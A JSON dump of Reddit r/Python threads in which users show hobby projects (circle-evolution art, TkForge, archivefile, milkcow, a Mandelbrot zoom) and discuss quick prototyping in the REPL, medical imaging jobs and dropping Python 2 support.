                {
                    "author": "texasram",
                    "score": "10",
                    "content": "I want to work with you"
                },
                {
                    "author": "bev_and_the_ghost",
                    "score": "5",
                    "content": "Idk why the man is getting downvoted. He’s right."
                },
                {
                    "author": "JohnBalvin",
                    "score": "4",
                    "content": "yeah probably, I don't use python on my daily basis, I'm a Go developer, I made the python version because python is more popular than go, a lot of people have mention to run the code with a code checker on other python projects, I'll start using them on future releases, thanks!"
                }
            ]
        }
    ]
},
{
    "post_author": "Itwist101",
    "post_id": "grglgp",
    "post_score": "1959",
    "post_time": "Wednesday, May 27, 2020 at 12:35:56 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Circle Evolution v0.1 is now available on PyPI. My first big project as a 16 year old. [Github repo & desc in comments]",
    "media": [
        "https://preview.redd.it/o0dlyr4r1a151.png?width=640&crop=smart&auto=webp&s=a97979fd412fdaaa385dc546765ee7552ff5e5a9",
        "https://i.redd.it/o0dlyr4r1a151.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "BBloggsbott",
            "score": "93",
            "content": "Great work!! Hoping to see more work from you.",
            "replies": [
                {
                    "author": "Itwist101",
                    "score": "41",
                    "content": "Thanks :)",
                    "replies": [
                        {
                            "author": "genericMaker",
                            "score": "5",
                            "content": "Did the A.I. Paint 🎨 this?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "dmitrypolo",
            "score": "78",
            "content": "Nicely done. One thing to note is that you are pinning your dependencies. Normally this is a good thing but since this is a library, this is typically not what you want to do. You will potentially miss out on upstream bug fixes and security improvements. Constraining versions is fine but having absolute versions is probably not the way to go."
        },
        {
            "author": "Ozzymand",
            "score": "89",
            "content": "my man's 16 and doing this and I just learnt how to print('Hello world') 😔😔😔"
        },
        {
            "author": "RomeoVEVO",
            "score": "15",
            "content": "Thank you for sharing! I'm currently playing with it using your sample script as a template, although I am having little success reproducing your results... Irrespective of the Mona Lisa picture size I always get 4 large circular looking shapes. Any advice?"
        },
        {
            "author": "Itwist101",
            "score": "69",
            "content": "[GITHUB REPO] Just one week ago I posted about my project on this subreddit and received amazing feedback from the community. I just wanna thank every one of you for motivating me in developing the project further and further. Basically what it does is try to mimic a target image using a limited amount of circles (in the examples above 256). This limitation generates novel looking images, and although time-consuming could be used as a compression technique. It works by mutating a species genotype every generation, if the mutated specie is better than it's parent, then it becomes the parent. The images you see above were trained using 250k generations on a 128*128 image. In the future I will add color, improve performance, and possibly even add more shapes."
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "Nice job! Glad there’s more teen programmers these days, keep doing what you’re doing right now, we’ll change the world together :)"
        },
        {
            "author": "Coffeinated",
            "score": "4",
            "content": "Nice work, independent of your age. Only porn should have the age in the title imo."
        },
        {
            "author": "PonyKillerMX",
            "score": "7",
            "content": "Waittttttttt you’re actually 16?!!!!!"
        },
        {
            "author": "Adro_95",
            "score": "3",
            "content": "How many circles would it take to make it very close to the original? Would it take too long to make?"
        },
        {
            "author": "[deleted]",
            "score": "3",
            "content": "Wow, great work! I like the combination of abstract at realistic works of art. This really combines the two for me. Looking forward to a version with color, would love to play around with it!"
        }
    ]
},
{
    "post_author": "HatWithAChat",
    "post_id": "1cegl14",
    "post_score": "66",
    "post_time": "Saturday, April 27, 2024 at 6:03:34 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "In what way do you try out small things when developing?",
    "media": [],
    "post_content": "I've noticed at work that my coworkers and I try out small things in different ways. Small things like if you want to try that adding two datetimes together behaves in the way you expect. Some people use jupyter notebook for this and others run python interactively in a separate command prompt.\nI usually run debug in whatever IDE I'm using and then letting it stop at the code I'm currently developing and then using the debug console to test things out. Sometimes this means just leaving the debugger at a breakpoint for half an hour while I continue writing code. Is my way of doing it weird or does it have any disadvantages? How do you usually test out things on the go in a good way?",
    "comments": [
        {
            "author": "wineblood",
            "score": "63",
            "content": "Pycharm scratch file"
        },
        {
            "author": "mikat7",
            "score": "22",
            "content": "It’s not weird, I do it all three ways you described, it just depends on the scale of the prototyping."
        },
        {
            "author": "captain_jack____",
            "score": "38",
            "content": "ipython",
            "replies": [
                {
                    "author": "pirsab",
                    "score": "5",
                    "content": "Yep, I always have a repl running on the side"
                },
                {
                    "author": "HatWithAChat",
                    "score": "2",
                    "content": "I got interested in ipython when I saw how easy it was to time functions with it. I haven't tried it out yet but maybe it's something I should try out.",
                    "replies": [
                        {
                            "author": "james_pic",
                            "score": "1",
                            "content": "It's occasionally useful, but small stuff in practice is often fast enough that making it faster isn't worth it unless it's in your hot loops, and big stuff is often affected more by environmental factors that are hard to replicate in IPython. If you've identified something as a problem via profiling and want to try out possible solutions it's really handy though."
                        }
                    ]
                },
                {
                    "author": "julsmanbr",
                    "score": "1",
                    "content": "Ctrl+Alt+T > ipython gang"
                }
            ]
        },
        {
            "author": "mr_engineerguy",
            "score": "24",
            "content": "I just run a script or test",
            "replies": [
                {
                    "author": "HatWithAChat",
                    "score": "6",
                    "content": "Sounds reasonable but is it not annoying that it's not interactive and that you have to keep rerunning the script/test?"
                }
            ]
        },
        {
            "author": "deltaexdeltatee",
            "score": "8",
            "content": "I almost always just use the REPL in a separate shell. My gut says that using the debugger how you're describing is slightly more risky, just because you have to pay a slight level of attention to making sure the code around what you're testing isn't passing something incorrect to the block you're actually focusing on - but yeah that just requires a quick sanity check in most cases, probably not a big deal. End of the day if it works for you and makes sense in your head, I don't see a compelling reason to stop. I never considered using a Jupyter notebook, that's an interesting idea. I could see it being particularly useful if you have an idea, want to test it, but aren't planning/ready to put it in the codebase yet."
        },
        {
            "author": "skytomorrownow",
            "score": "15",
            "content": "Debugger for 'WTF?' iPython for 'What if I...?' Jupyter for \"Here's how I'm going to...\". For laying out my reasoning – I really like mixing markdown notes with code and making a guide to come back to later. It's a great record of experiments. tldr; Debugger is my factory-floor 'hold the presses' fix-it-finder. iPython is my engineering lounge. Jupyter is my academic think-tank."
        },
        {
            "author": "hotplasmatits",
            "score": "6",
            "content": "I do all of that plus create standalone tests. One of my open tabs is a jupyter notebook. It's all a matter of what you need."
        },
        {
            "author": "kernco",
            "score": "5",
            "content": "I use jupyter notebook. I think your method is better because you're testing in the real state that your program would be in. Sometimes I run into unexpected problems where something that worked in the notebook ends up not working in the actual code because there was some subtlety about the state I missed initializing in the notebook. I develop data analysis scripts and sometimes it can take a long time, like hours, for the script to get to the debugger breakpoint, so jupyter ends up being more convenient."
        },
        {
            "author": "markovianmind",
            "score": "3",
            "content": "I use spyder,that can be handy with an interactive terminal"
        },
        {
            "author": "BranchLatter4294",
            "score": "2",
            "content": "I would generally do it in a separate file/program or notebook cell."
        },
        {
            "author": "dogfish182",
            "score": "2",
            "content": "Integrated repl from pycharm while I’m developing combined with tests so I can step through the execution with debugger where needed"
        },
        {
            "author": "panatale1",
            "score": "2",
            "content": "I just run iPython in a separate shell window"
        },
        {
            "author": "xr09",
            "score": "2",
            "content": "bpython is my go to"
        },
        {
            "author": "violentlymickey",
            "score": "2",
            "content": "Typically I write a small function or module then write some tests. If I want to do some sort of \"sanity check\", then I'll mock up some code in ipython. Ideally I want to write tests beforehand and write code to pass the tests (TDD), but sometimes it's difficult to create this sort of scenario simply."
        },
        {
            "author": "russellvt",
            "score": "2",
            "content": "If you type \"python\" on the command line, there's a built-in interactive debugger, called IDLE. /s"
        },
        {
            "author": "iChinguChing",
            "score": "2",
            "content": "Vscode + ipynb = joy"
        },
        {
            "author": "billsil",
            "score": "1",
            "content": "If I’m working with an existing code, I’ll just start writing code and then just paste it into the debugger.  At some point I’ll restart and do it again. I usually don’t write many short scripts."
        },
        {
            "author": "RobertD3277",
            "score": "1",
            "content": "I have a folder of cold proofs where I just slap together various testing methods necessary to isolate a particular approach that I'm using. I don't use an IDE or anything of that nature, as I never know what environment I'm going to be working in from day to day. So I take the most memory basic context of my code, and keep it on a VPS that I can access from anywhere where I can draw from quick little tidbits as needed."
        }
    ]
},
{
    "post_author": "_-Dan_-",
    "post_id": "1ccb350",
    "post_score": "4",
    "post_time": "Thursday, April 25, 2024 at 1:05:48 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What is your best Tkinter project that you put a lot of effort into creating?",
    "media": [],
    "post_content": "I want to hear your description of the project you are most proud of. I was just trying to find something on the Internet, but I didn't find much of interest. The only difficult project was CustomTkinter, which, as far as I know, was done entirely in Tkinter. Since it is possible to create something this complex, I'm sure you have something cool too.\nNote: I am expecting to hear projects more complex than a calculator :)",
    "comments": [
        {
            "author": "winches-",
            "score": "2",
            "content": "Im a cnc programmer, I created a tkinter app that holds a bunch of different thread data all in one place. It has a separate page on it that has common machinist calculators, a section to mass create folders with standard names that I typically use. Finally, a section that has a list of special codes for each machine and what the code does a well. This app put a ton of different data I use on a daily basis into a single location."
        },
        {
            "author": "pnprog",
            "score": "2",
            "content": "https://github.com/pnprog/goreviewpartner A tool to help analyse and review your game of go (weiqi, baduk) using strong bots. It's an old project, made with Python 2.x At the time, my coding skills really needing some improvement... I would like to find time to rewrite it entirely. Might go with wxpython this time, or something using WebView. The lack of threading support in tkinter was really annoying.",
            "replies": [
                {
                    "author": "VeganBigMac",
                    "score": "2",
                    "content": "That name, though."
                }
            ]
        },
        {
            "author": "Mean_Range_1559",
            "score": "2",
            "content": "This is a bit old but I'm new here. I'm by no means a developer, just a fuck-around-and-find-out-er, but I'm developing a TCG and came across a tool called Nandeck. Didn't suit my needs, so I started developing my own application using Tk. It allows Excel file imports, a directory for graphical assets, ability to map the data to the assets, and then compiles and exports the cards ready for print. Decided it was ugly, scrapped the entire thing and started again using PySide6 and I'm about halfway through it at the moment - and loving it!"
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "l7u2m3",
    "post_score": "1907",
    "post_time": "Friday, January 29, 2021 at 5:39:11 PM GMT+3",
    "flair_text": "Beginner Showcase",
    "post_title": "This post has:",
    "media": [
        "https://www.reddit.com/u/InveitableCactus",
        "https://github.com/Jonathan357611/Reddit-comment-statistics",
        "https://www.reddit.com/r/Python/comments/hoolsm/this_post_has/",
        "https://www.reddit.com/u/Krukerfluk",
        "https://www.reddit.com/u/CaminoFr",
        "https://www.reddit.com/u/Valtsu0",
        "https://www.reddit.com/u/BimphyRedixler",
        "https://www.reddit.com/u/_elbob"
    ],
    "post_content": "(Offline)\nHello! I made a little Program which gets statistics about this post! It should be update every 20 seconds.\nThis post has 2109 Upvotes!\nIt has 234 Downvotes\nand 299 comments!\nThe 3 top comments are from:\nu/BimphyRedixler\n|_Upvotes: 450\n|_First word: I\n|_Last word: account\n|_Letters: 41\nu/[deleted]\n|_Upvotes: 59\n|_First word: [removed]\n|_Last word: [removed]\n|_Letters: 9\nu/CaminoFr\n|_Upvotes: 105\n|_First word: \",\n|_Last word: None\n|_Letters: 7\nu/[deleted]\n|_Upvotes: 131\n|_First word: EditingThisToSeeIfICangeTheFirstWordSetting.\n|_Last word: AlsoChangingThisLOL!😂\n|_Letters: 86\nu/InveitableCactus\n|_Upvotes: 29\n|_First word: \"\n|_Last word: \"\n|_Letters: 32\nNote: Sometimes theres a Person with lesser upvotes on place 1, If people are disliking comments, the reddit api does weird things!\nSecond note: The Up/Downvotes and comments are NOT accurate!\nLast update: 2021-02-06 20:11:24 CET\ntotal updates: 21319\nLatest comment by: u/_elbob\nFirst word: testing\nLast word: code\nLetters: 16\nRandom Comment: Left to right unicode charecter\nby: u/Valtsu0\nThis idea was inspired by u/Krukerfluk Krukerfluk's post: https://www.reddit.com/r/Python/comments/hoolsm/this_post_has/\nMy code on Github: https://github.com/Jonathan357611/Reddit-comment-statistics\nThis program is hosted on a Raspberry pi zero!",
    "comments": [
        {
            "author": "[deleted]",
            "score": "459",
            "content": "I see Tom Scott just got a reddit account",
            "replies": [
                {
                    "author": "kurti256",
                    "score": "42",
                    "content": "How do you do the thing Tom Scott did?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "56",
                            "content": "Tom Scott just has made something similar to this, it parses the views and edit the title"
                        },
                        {
                            "author": "GoldArrow997",
                            "score": "3",
                            "content": "https://github.com/scxr/title_view_changer pretty simple, written by me, just add a for loop to update every x seconds"
                        }
                    ]
                },
                {
                    "author": "theawesomenachos",
                    "score": "3",
                    "content": "I know you’re joking, but Tom Scott used to have his own subreddit (and maybe even an account idk) before he asked it to be taken down because he was getting doxed or something.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "damn that sucks"
                        }
                    ]
                },
                {
                    "author": "tempo-19",
                    "score": "5",
                    "content": "Beat me to it."
                },
                {
                    "author": "ywBBxNqW",
                    "score": "1",
                    "content": "Why does your account name have a colored background? I notice it with some other accounts posting in this thread too."
                }
            ]
        },
        {
            "author": "CaminoFr",
            "score": "107",
            "content": "\", None",
            "replies": [
                {
                    "author": "Pumphutt",
                    "score": "34",
                    "content": "Little Bobby Tables we call him."
                }
            ]
        },
        {
            "author": "Exodus111",
            "score": "135",
            "content": "EditingThisToSeeIfICangeTheFirstWordSetting. I gotta try this. AlsoChangingThisLOL!😂"
        }
    ]
},
{
    "post_author": "axorax",
    "post_id": "1cdo8uj",
    "post_score": "276",
    "post_time": "Friday, April 26, 2024 at 6:26:01 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Python app that turns your Figma design into code",
    "media": [
        "https://github.com/Axorax/tkforge"
    ],
    "post_content": "Link: https://github.com/Axorax/tkforge\nHey, my name is Axorax. I have been programming for a few years now. I started making a lot more projects in Python recently and this is one of them. I decided to call the project TkForge.\nWhat My Project Does TkForge allows you to turn your Figma design into code. So, you can make the UI for an app in Figma and add input fields, buttons and much more and name them properly then you can run TkForge to convert your Figma design into code. The names need to be the element that you want. For example; if you want a button element then you can name it \"button\" or \"button Hello World!\". The \"Hello World!\" portion will just get ignored. All of the text after the first space is ignored. However, for some elements, they matter. Like, if you want a textbox element with the placeholder text of \"Hello\" then you need to name it \"textbox Hello\".\nTarget Audience It is meant for anyone who wants to create a GUI in Python easily. Dealing with Tkinter can be a pain a lot of times and it also takes a long time. Using TkForge, you can make better UI's and also get a lot of work done in a short amount of time. Anyone who is new to Python or even an expert can use TkForge to speed up their development times and get a better result. You can TkForge in your production app or for a demo app and really anywhere if you are also using Python.\nComparison There is another project called TkDesigner that does the same sort of thing. But TkForge is able to generate better code. TkForge also supports a lot more elements. Placeholder text for textbox and textarea are not built-in to Python. But TkForge has support for those even though using them requires you to handle a lot of situations by yourself (TkForge provides functions for these situations to be handled correctly, you need to implement them were needed yourself).\nThank you for reading! <3",
    "comments": [
        {
            "author": "N1H1L",
            "score": "78",
            "content": "Please post this to Hacker News too. They will love it and your project will reach a bigger audience. Great project BTW.",
            "replies": [
                {
                    "author": "axorax",
                    "score": "9",
                    "content": "Thanks for the suggestion! Means a lot to me :D"
                }
            ]
        },
        {
            "author": "IamVat",
            "score": "26",
            "content": "This looks awesome, I will definitely give this a shot for a project.",
            "replies": [
                {
                    "author": "axorax",
                    "score": "4",
                    "content": "Thanks <3"
                }
            ]
        },
        {
            "author": "JSP777",
            "score": "25",
            "content": "This is scarily timed when our company announced just today that we will use Figma 😂",
            "replies": [
                {
                    "author": "axorax",
                    "score": "5",
                    "content": "The odds 🤣"
                }
            ]
        },
        {
            "author": "AtypicalGuido",
            "score": "6",
            "content": "This is a great idea"
        },
        {
            "author": "Please_Not__Again",
            "score": "3",
            "content": "Great work!"
        },
        {
            "author": "Apprehensive_Pie_478",
            "score": "2",
            "content": "I’m gonna check it out, pretty new to programming after working as a TPM for years and I like doing BE work a lot more then FE but most people don’t care what I’m doing if they can’t stare at something pretty I’m sure this will save me a ton of time thanks in advance!"
        },
        {
            "author": "hetermeeeens",
            "score": "2",
            "content": "Awesome work! I'll definitely try it out. Tkinter is the worst 😅"
        }
    ]
},
{
    "post_author": "Durysik",
    "post_id": "1cfx0qe",
    "post_score": "12",
    "post_time": "Monday, April 29, 2024 at 2:44:08 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Medical imaging Python jobs",
    "media": [],
    "post_content": "Hi folks!\nI am currently looking for a US (west coast best) based job where I could grow as a python programmer, specifically analysing medical images.\nLooking online I found some labs where they work with images, but I thought I'd ask (not sure if it's the right sub tho) cause I'm sure this way I'll hear about many places that deal with Medical Imaging.\nThanks :)",
    "comments": [
        {
            "author": "riklaunim",
            "score": "4",
            "content": "There are some medical database that can be used for R&D (not sure about access though) but for live medical operations 100% of tasks will be made on certified hardware and software, no software developers tinkering. You could look for companies doing machine vision, specialized imaging type of stuff, although likely they won't use Python, depends.",
            "replies": [
                {
                    "author": "aganders3",
                    "score": "3",
                    "content": "You can write software for medical devices and software as a medical device (SAMD) in Python, at least for class II devices. Most imaging applications just require documentation of product and process. I’ve built a career in imaging, mostly medical imaging, and much of my work has been Python.",
                    "replies": [
                        {
                            "author": "Durysik",
                            "score": "1",
                            "content": "Thanks for the answer! So the key is looking for companies producing such medical devices? Could I pm you?",
                            "replies": [
                                {
                                    "author": "aganders3",
                                    "score": "1",
                                    "content": "Sure"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Durysik",
                    "score": "2",
                    "content": "Thanks! During uni, I've used various databases with medical images (for instance I've had two projects with tumor segmentation). Machine vision - I'll check it out! Why won't they use python? Is c++ more popular, or sth entirely different? I thought python is commonly used with image processing."
                }
            ]
        },
        {
            "author": "codesauce",
            "score": "2",
            "content": "Job: https://pearl-ai.breezy.hr/p/20630cb6a1f6-machine-learning-scientist?source=www.hellopearl.com/contact If you don't already know: https://www.dicomstandard.org/",
            "replies": [
                {
                    "author": "Durysik",
                    "score": "2",
                    "content": "Thanks! I am well versed with Dicom :) Not a machine learning expert tho, I have some experience but I'm not a pro :/"
                }
            ]
        },
        {
            "author": "MonkeyboyGWW",
            "score": "1",
            "content": "Oracle have some projects like that going at the moment.",
            "replies": [
                {
                    "author": "Durysik",
                    "score": "1",
                    "content": "Oracle! Thanks!"
                }
            ]
        },
        {
            "author": "SquiffyUnicorn",
            "score": "1",
            "content": "You could do worse than looking at SIIM- Society of Imaging Informatics in Medicine. I’m sure you could make appropriate contacts there. Also, if you are anywhere near Stanford they have a world class medical AI lab. The boss is Curt Langloltz- very famous in the radiology AI world. He recently visited Singapore (where I am) - very nice guy.",
            "replies": [
                {
                    "author": "Durysik",
                    "score": "1",
                    "content": "That's some solid tips! I'll check out both, thank you so much!!"
                }
            ]
        }
    ]
},
{
    "post_author": "PredatorOwl",
    "post_id": "1censu3",
    "post_score": "16",
    "post_time": "Saturday, April 27, 2024 at 11:14:25 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ArchiveFile: Unified interface for tar, zip, sevenzip, and rar files",
    "media": [
        "https://github.com/miurahr/py7zr",
        "https://github.com/Ravencentric/archivefile",
        "https://docs.python.org/3/library/zipfile.html",
        "https://ravencentric.github.io/archivefile",
        "https://docs.python.org/3/library/tarfile.html",
        "https://github.com/markokr/rarfile"
    ],
    "post_content": "What My Project Does\narchivefile is a wrapper around tarfile, zipfile, py7zr, and rarfile. The above libraries are excellent when you are dealing with a single archive format but things quickly get annoying when you have a bunch of mixed archives such as .zip, .7z, .cbr, .tar.gz, etc because each library has a slightly different syntax and quirks which you need to deal with. archivefile wraps the common methods from the above libraries to provide a unified interface that takes care of said differences under the hood. However, it's not as powerful as the libraries it wraps due to lack of support for features that are unique to a specific archive format and library.\nTarget audience\nAnyone who's using python to deal with different archive formats\nComparison\nZipFile, TarFile, RarFile, and py7zr - These are libraries that mine wraps since each of them can only deal with a single archive format\nshutil - Shutil can only deal with zipfile and tarfile and only allows full packing or full extraction.\npatool - Excellent library that deals with wider range of formats than mine but in doing so it provides less granular control over each ArchiveFile falls somewhere between the powerful dedicated library and the far less powerful universal libaries.\nLinks\nRepository: https://github.com/Ravencentric/archivefile Docs: https://ravencentric.github.io/archivefile",
    "comments": [
        {
            "author": "VooDooNOFX",
            "score": "2",
            "content": "This is very helpful! A question though: Why do I need to open the archive file in write mode just to extract something: with ArchiveFile(\"archive.tar\", \"w\") as archive: archive.extract(\"member.txt\") # Extract a single member of the archive Also, why did you name each file in your source “_something”?",
            "replies": [
                {
                    "author": "PredatorOwl",
                    "score": "10",
                    "content": "Why do I need to open the archive file in write mode just to extract something: You don't, seems to be just a typo in examples Also, why did you name each file in your source “_something”? They are private and not meant to be imported by end user. Common python convention is to use underscore as a prefix to indicate something is not part of the public api"
                }
            ]
        },
        {
            "author": "ZachVorhies",
            "score": "2",
            "content": "Thanks I wanted to do something like this."
        },
        {
            "author": "Brian",
            "score": "1",
            "content": "libarchive would be worth mentioning as a comparison, as I believe it supports all of those and more. Downside is that it's not the nicest API (mostly the same as the C API of the libarchive library it wraps), and it can't do stuff like efficient random access in formats that can support it, like zip."
        },
        {
            "author": "zom-ponks",
            "score": "1",
            "content": "Huh, I was looking for something like this just recently since I'm dealing with a lot of archive files, doing some extraction and cleaning up directory structures etc. etc., and of course there's several formats to contend with. At first I just looked at the extension and then passed it on to a different subroutine depending on format, but as the complexity of the script is growing this is frustrating. So looks like this is just what the doctor ordered! Thank you, I just installed it and will try it soonish."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ccdo2r",
    "post_score": "2",
    "post_time": "Thursday, April 25, 2024 at 3:00:11 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "Samuel_G_Reynoso",
    "post_id": "1cecfnn",
    "post_score": "0",
    "post_time": "Saturday, April 27, 2024 at 2:35:09 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "milkcow - First package/library",
    "media": [
        "https://github.com/SamReynoso/milkcow",
        "https://pypi.org/project/milkcow/"
    ],
    "post_content": "Excited to share milkcow, my first python package. I'd love any feedback, and to continue to build out the parts of this package that show potential.\nhttps://pypi.org/project/milkcow/ https://github.com/SamReynoso/milkcow\nWhat MilkCow Does\nMilkcow automates database creation and offers in-memory key-value mapping for data handling. Whether you're building middleware, local storage, or multiprocessing scripts.\nTarget Audience\nMilkCow is designed for developers looking to streamline the development process. It caters to those who want to simplify data.\nComparison\nMilkcow aims for simplicity. Milkcow offers a way for making it easier for developers to get started. Additional functionalities, including database creation and the in-memory datastore, enhancing its usability.\nfrom milkcow import ObjectCow\n\noc = ObjectCow(Record)\noc.push('Bob', records)\nobjs = oc.new('Bob')\nk, v = oc.items()\nfor k in oc.keys()\nnew = oc.new(k)\nfrom milkcow import MilkCow\n\nmc = MilkCow(Record)\nmc.pull('Bob')\nmc.push('Alice', list[Record])\nsender = mc.sender.new_sender()\nsender = mc.sender.all_sender()\nsender = mc.sender.keyed_sender('Alice')\nsender.send()",
    "comments": [
        {
            "author": "SciEngr",
            "score": "2",
            "content": "Some notes: For your cli, just use click. You're doing a lot of work to make a cli that is way too hard to read and follow and that requires a shit ton of modifications every time you add a feature. You also seem to be trying to parse json on your own rather than just use the built in json package...why? Why would someone use this instead of something like duckdb? https://duckdb.org/docs/extensions/sqlite",
            "replies": [
                {
                    "author": "Samuel_G_Reynoso",
                    "score": "2",
                    "content": "Well. when it came time to write the cli tool I decided to just stick to the diy theme.all the way through."
                }
            ]
        },
        {
            "author": "iowarelocation",
            "score": "1",
            "content": "from milkcow import ObjectCow oc = ObjectCow(Record) oc.push('Bob', records) objs = oc.new('Bob') k, v = oc.items() for k in oc.keys() new = oc.new(k) from milkcow import MilkCow mc = MilkCow(Record) mc.pull('Bob') mc.push('Alice', list[Record]) sender = mc.sender.new_sender() sender = mc.sender.all_sender() sender = mc.sender.keyed_sender('Alice') sender.send()"
        },
        {
            "author": "Zelamfvvvvfvvvv",
            "score": "1",
            "content": "I'm new in python programming, but I really want to try this package, because I'm interested in data science and databases."
        }
    ]
},
{
    "post_author": "knods",
    "post_id": "dv7np3",
    "post_score": "1957",
    "post_time": "Tuesday, November 12, 2019 at 12:25:25 PM GMT+3",
    "flair_text": "",
    "post_title": "6 Months of learning Python, 3 Hours of Rendering, here is my first Mandelbrot Zoom",
    "media": [
        "https://preview.redd.it/jb9syvvk48y31.gif?width=640&crop=smart&format=png8&s=fac38e527bfe55657b6de2d1770db192b8a41e3c"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "rerebooted",
            "score": "110",
            "content": "Care to share GitHub? :D",
            "replies": [
                {
                    "author": "knods",
                    "score": "23",
                    "content": "glad to share, just didn't think anyone would be particularily intersted in this really. see my answer on the top comment for the code. :) https://hastebin.com/raw/anumivulox edit: used other hoster.",
                    "replies": [
                        {
                            "author": "AceBuddy",
                            "score": "7",
                            "content": "lol this is cool of course people will be interested!"
                        },
                        {
                            "author": "_meow4",
                            "score": "1",
                            "content": "I think it expired.. mind putting this on GitHub for permanent use?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "gabri3zero",
            "score": "76",
            "content": "It would be pretty interesting to have a look at the source code"
        },
        {
            "author": "Mph024",
            "score": "29",
            "content": "Howd you do that"
        },
        {
            "author": "lochyw",
            "score": "22",
            "content": "I wonder if its possible to make it loopable.. :p"
        },
        {
            "author": "andrewq",
            "score": "11",
            "content": "Check out FRACTINT https://fractint.org/"
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "This is so trippy can watch for hours straight"
        },
        {
            "author": "FuzzNugs",
            "score": "7",
            "content": "Good job OP. There are numerous people asking to see the source. It would be great of you to make it available for them. I too would like to see the rendering stuff you’ve done here. Thanks."
        },
        {
            "author": "knods",
            "score": "6",
            "content": "hey, didn't expect anyone to be interested here you go:https://hastebin.com/raw/anumivulox hope that works. if it expires or something, just tell me i'll try and upload it again somewhere else. for anyone interested i toyed with the res variable and the range of i.i don't quite remember the res, but i'm pretty sure in this version i was in range (0,150) the principle idea of calculation with numpy is from here. oh, by the way, this doesn't include the .gif creation, sorry for that. it's just exactly this. all the best. :)"
        },
        {
            "author": "intensehardik",
            "score": "8",
            "content": "Where did u do the rendering? (software)"
        },
        {
            "author": "Batmanly72",
            "score": "7",
            "content": "Bro,you can share your code,we would like to see it"
        }
    ]
},
{
    "post_author": "koungmeng",
    "post_id": "bun5px",
    "post_score": "1907",
    "post_time": "Thursday, May 30, 2019 at 4:26:48 AM GMT+3",
    "flair_text": "",
    "post_title": "Dear python2 user",
    "media": [
        "https://preview.redd.it/qu3jvnny39131.jpg?width=640&crop=smart&auto=webp&s=5e6a0ac0a17024fd7bd4d6c065fb0d3df779f56d",
        "https://i.redd.it/qu3jvnny39131.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "billsil",
            "score": "277",
            "content": "I killed my libraries support for python 2 last Friday. It feels good to get rid of six, future, scans it, and pathlib2 and really start doing type annotations properly. People are already trying to get me to change my mind. But my company uses Anaconda...use a virtual environment; Anaconda lets you have multiple versions of python. It’s coming like a train and all my dependencies have moved on. Time for me to as well."
        },
        {
            "author": "SketchyMikePemulis",
            "score": "132",
            "content": "print(\"good riddance\")"
        },
        {
            "author": "alcalde",
            "score": "75",
            "content": "OK, where's the person here who keeps telling me that the PSF is definitely going to extend the deadline again?"
        },
        {
            "author": "-LeopardShark-",
            "score": "105",
            "content": "python3statement.org"
        },
        {
            "author": "captain_cashew",
            "score": "56",
            "content": "My company is moving from 2.6 to 2.7! Yay!"
        },
        {
            "author": "hopeinson",
            "score": "58",
            "content": "Now that you have heard of Python 3, now get ready for Python 4! [/s] But seriously, we need to start moving on from Py2. It's a dead horse meat now."
        },
        {
            "author": "[deleted]",
            "score": "14",
            "content": "I have been working in 3.x exclusively now for some years, but I recently took out support for 2.x from a couple of old libraries and it was like getting a little stone out of my shoe. Interestingly 3.4 is now a slight pain point - there are a couple of CI tools like mypy that are only available for Python 3.5 onwards. In new development, I don't support 3.4, but I haven't yet removed it from old libraries that have existing users because why make their lives miserable? 3.4.10, the final version of 3.4, has only recently been released..."
        },
        {
            "author": "acerbusbellum",
            "score": "22",
            "content": "Well unfortunately until the DCC's (Maya, Nuke, Houdini) and our project management system (shotgun) change the interpreters to py3 we'll be such with it. Has anyone seen much about what Autodesk, Foundry, etc have said about support for py3?"
        },
        {
            "author": "mrrichardcranium",
            "score": "27",
            "content": "Just started using python. Learned python 2 because of the systems and frameworks I’m using at work. This last week I started moving all things possible to python 3 in anticipation for it becoming the default on coming OSs. Holy hell does it make a lot of things easier. Basic threading in 3 makes me wish I could rewrite the frameworks my work uses so I could make the full jump over and never look back."
        }
    ]
},
{
    "post_author": "swizzex",
    "post_id": "hsf3ce",
    "post_score": "1953",
    "post_time": "Thursday, July 16, 2020 at 9:21:34 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Learning python so my wife customized my tumbler.",
    "media": [
        "https://i.redd.it/d6imk1ahh9b51.jpg",
        "https://preview.redd.it/d6imk1ahh9b51.jpg?width=640&crop=smart&auto=webp&s=c074f7b31a8615c808dc2edadb8d826566786308"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "iroll20s",
            "score": "148",
            "content": "Not the tumblr I was expecting when I clicked."
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Damn now op needs a debug mug.",
            "replies": [
                {
                    "author": "callinthekettleblack",
                    "score": "35",
                    "content": "Damn now op needs a debug mug.",
                    "replies": [
                        {
                            "author": "itypewithmyhands",
                            "score": "14",
                            "content": "A demug?"
                        }
                    ]
                },
                {
                    "author": "leone_nero",
                    "score": "64",
                    "content": "Oh yes, my eyes suffered because of this 😂😂 edit: cool gift though"
                },
                {
                    "author": "swizzex",
                    "score": "34",
                    "content": "Didn’t even notice it until you called it out and now I can’t unsee it. And I know she was just typing it on the iPad and it always automatically capitalized the first word.",
                    "replies": [
                        {
                            "author": "meatatfeast",
                            "score": "17",
                            "content": "Should have been using emacs"
                        }
                    ]
                },
                {
                    "author": "pcvision",
                    "score": "7",
                    "content": "oufff"
                }
            ]
        },
        {
            "author": "keepitsalty",
